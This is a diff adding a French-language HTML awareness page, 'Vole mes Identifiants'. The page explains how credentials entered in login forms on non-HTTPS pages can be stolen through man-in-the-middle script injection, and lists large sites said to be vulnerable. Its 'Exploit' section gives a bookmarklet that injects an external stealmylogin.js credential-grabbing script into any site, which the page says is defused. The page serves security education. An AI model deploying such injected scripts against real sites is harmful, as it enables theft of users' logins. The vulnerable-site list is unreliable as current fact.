@@ -1,0 +1,162 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+
+<title>Vole mes Identifiants test . Ce test a été crée pour montrer la facilité avec laquel on peut voler vos mots de passes sur internet</title>
+
+<style type="text/css">
+body { font-family: Verdana,Tahoma,Helvetica,sans-serif; font-size: 14px; line-height:1.4em; padding:0;margin:0;  }
+a, a:link,a:visited,a:active { color: #2F84EA; text-decoration: none; }
+a:hover { color: #2F84EA; text-decoration: underline; } 
+h1 { margin: 4px 0 0 0; padding: 0; font-size: 22px; }
+h2 { font-size: 18px; margin: 1em 0 0.5em 0; }
+p { margin:10px 0 0; }
+li { margin: 0.5em 0; }
+#wrapper { background: #fcfcfc; margin: 0 auto; width:640px; padding: 1em; border: 1px solid #ddd; border-width: 0 1px; }
+#footer, #tags { margin: 1em 0; color: #999; font-size: 0.9em;  width: 900px; }
+.problem { color: red; }
+.bookmarklet { border: 1px solid #ddd; padding: 1px 3px; background: #f4f4f4;}
+.author { float:right; font-size: 0.85em; color: #666 }
+.fixed {text-decoration: line-through !important;} 
+</style>
+
+</head>
+<body>
+
+<div id="wrapper">
+
+<h1>Vole mes Identifiants</h1>
+<p class="author">écrit par <a href="https://github.com/alexdieu">Alexdieu</a>
+<p>Montre les dangers des formes de login non sécurisées
+
+<p>
+<a href="http://twitter.com/share" class="twitter-share-button" data-count="horizontal" data-via="iosart">Tweet</a><script type="text/javascript" src="../platform.twitter.com/widgets.js"></script>
+
+<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fwwwl.stealmylogin.com%2F&amp;layout=button_count&amp;show_faces=true&amp;width=450&amp;action=like&amp;font=arial&amp;colorscheme=light&amp;height=21" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:21px;margin-top:2px" allowTransparency="true"></iframe>
+
+<p>
+<a href="index.html#disqus_thread">Commentaires</a>
+
+<h2>Intro</h2>
+<p>
+On utilise souvent une connection non sécurisé pour se balader sur internet - par exemple , en utilisant des <a href="https://www.kaspersky.fr/resource-center/preemptive-safety/public-wifi-risks"> wifis publics</a> ou si le routeur est configuré pour utiliser un <a href="http://megastuces.com/les-protocoles-securite-wifi-wep-wpa-wpa2/">protocole no sécurisé</a>. Ca nous expose à <a href="https://fr.wikipedia.org/wiki/Attaque_de_l%27homme_du_milieu">"Man-in-the-middle attacks" l'attaque de l'homme du milieu en fr</a>, avec des pirates , essayant de vous voler vs mots de passes , vos ID , etc . 
+
+<p>
+Il y a une solution très simple à ce probleme , - Quand on envoie une information délicate à un site internet , il devrait TOUJOURS utiliser <a href="https://fr.wikipedia.org/wiki/HyperText_Transfer_Protocol_Secure">HTTPS</a>. Comme ca , les pirates peuvent écouter vos communications , certes mais seulement encrypté par la clé du site . Il ne peuvent pas la décrypter sans posseder <a href="https://fr.wikipedia.org/wiki/Cryptographie_asym%C3%A9trique#S%C3%A9curit%C3%A9">la clé privée du site web</a>. Vous savez que la connection d'un site est sécurisé quand 'https:' est dans l'url , Et votre navigateur montre un cadena fermé , et autres signes additionnels.  
+
+<h2>Le probleme</h2>
+<p>
+<strong class="problem">Alors que la plupart des sites Web ont implémenté un moyen sécurisé d'envoyer des informations de connexion, leur implémentation est défectueuse, permettant toujours à un attaquant malveillant de voler vos informations de connexion.</strong>
+<p>
+Pour que le formulaire de connexion sécurisé vous protège, la page qui affiche le formulaire de connexion et la page à laquelle le formulaire est soumis doivent être HTTPS.
+<p>
+Beaucoup des plus grands sites du Web ont des pages non HTTPS hébergeant le formulaire de connexion proprement dit, même s'ils soumettent les informations de connexion à une page HTTPS.
+<p>
+<strong class="problem">Un attaquant malveillant peut facilement injecter du code dans la page non HTTPS qui héberge le formulaire de connexion et voler vos informations juste avant qu'elles ne soient soumises en toute sécurité.</strong>
+
+<h2>Demo</h2>
+Regardez le <a href="demo.html">Vole-mes-ID demo</a>. 
+Comme pour de nombreux sites, dans <a href="demo.html">la demo</a> une page non HTTPS contient un formulaire de connexion qui est soumis en toute sécurité à une page HTTPS. 
+<p>
+Si vous regardez le code source de la page de démonstration, vous verrez que nous avons injecté un fichier JavaScript malveillant <a href="stealmylogin.js">stealmylogin.js</a> (disponible sur internet(ip grabber et envoie d'information désamorcé , pour plus de sécurité NE RENTREZ DES LOGINS QUI NE CORRESPONDENT A RIEN))dans la page, tout comme un attaquant pourrait. Ce code malveillant vole les informations de connexion juste avant qu'elles ne soient soumises en toute sécurité au service.
+
+<h2>Exploit</h2>
+Vous voulez essayer cette attaque vous-même sur l'un de vos sites Web préférés? Faites simplement glisser le lien suivant <a class="bookmarklet" href="javascript:(function() {var s=document.createElement('script');s.src='../www.data.stealmylogin.com/stealmylogin.js';document.getElementsByTagName('head')[0].appendChild(s);alert('StealMyLogin injected');})();">StealMyLogin</a> 
+
+<h2>Sites Vulnérables liste</h2>
+Il s'agit évidemment d'une liste très partielle, mais il est étonnant de voir combien des plus grands sites du Web présentent cette faille de sécurité importante.
+<ul>
+<li><a href="http://linkedin.com/">LinkedIn</a>
+<li><a class="fixed" href="http://twitter.com/">Twitter</a>
+<li><a href="http://facebook.com/">Facebook</a>
+<li><a href="http://www.att.com/">AT&T</a>
+<li><a class="fixed" href="http://www.netflix.com/">Netflix</a>
+<li><a href="http://www.godaddy.com/">GoDaddy</a>
+<li><a href="http://www.progressive.com/login.aspx">Progressive</a>
+<li><a href="http://www3.tivo.com/tivo-tco/login/show.do">Tivo</a>
+<li><a class="fixed" href="http://www.ups.com/">UPS</a>
+</ul>
+
+
+<h2>Détails complémentaires</h2>
+Quelques conseils : 
+<ol>
+<li>Il y a des personnes mal intentionées (BLACK HAT) qui cherchent à voler vos informations bancaires ou de carte de crédit, votre argent et votre identité.
+<li>De nombreuses personnes utilisent le même mot de passe et nom d'utilisateur dans de nombreux services en ligne différents, y compris les banques.
+<li>Des attaquants malveillants tenteront d'obtenir vos informations de connexion pour l'un des services que vous utilisez, ce qui leur permettra ensuite de pénétrer dans le reste.
+</ol>
+
+<p>
+Tvoici plusieurs façons dont un attaquant peut essayer de voler vos informations de connexion :
+<ul>
+<li><a href="https://www.economie.gouv.fr/dgccrf/Publications/Vie-pratique/Fiches-pratiques/Phishing-hameconnage-ou-filoutage">Phishing</a>  - vous envoyer un e-mail contenant un lien vers un faux site qui ressemble au vrai .
+<li><a href="https://www.ionos.fr/digitalguide/sites-internet/developpement-web/quest-ce-que-le-xss-cross-site-scripting/">Cross-site scripting (XSS)</a>  - exploiter une vulnérabilité dans un site Web pour injecter du code JavaScript personnalisé qui tenterait ensuite de voler vos informations.
+<li><a href="https://fr.wikipedia.org/wiki/Attaque_de_l%27homme_du_milieu">Man-in-the-middle attack</a> - écouter les informations qui transitent par une connexion de données non sécurisée (comme un point d'accès wifi "gratuit" malveillant), potentiellement injecter du code malveillant dans les sites Web visités.
+</ul>
+<p>
+Ici, nous discutons du dernier type d'attaque - l'homme au milieu.
+
+<h2>References</h2>
+<ul>
+<li><a href="https://www.websecurity.digicert.com/fr/fr/security-topics/what-is-ssl-tls-https">TLS et SSL , c'est secure ?</a>
+</ul>
+
+<h2>Discuss</h2>
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://volemesid.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+
+<div id="tags">
+Tags: security, identity theft, phishing, https, ssl, login form, username, passwords
+</div>
+<div id="footer"><span class="copyright">Copyright &copy; 2020 <a href="">Alexdieu</a></span></div>
+
+</div> <!-- wrapper -->
+
+<script type="text/javascript"> 
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-1155620-6']);
+  _gaq.push(['_trackPageview']);
+ 
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script> 
+<script id="dsq-count-scr" src="//volemesid.disqus.com/count.js" async></script>
+</script>
+
+</body>
+
+
+</html>
+
+
+
+
+
+
+
+
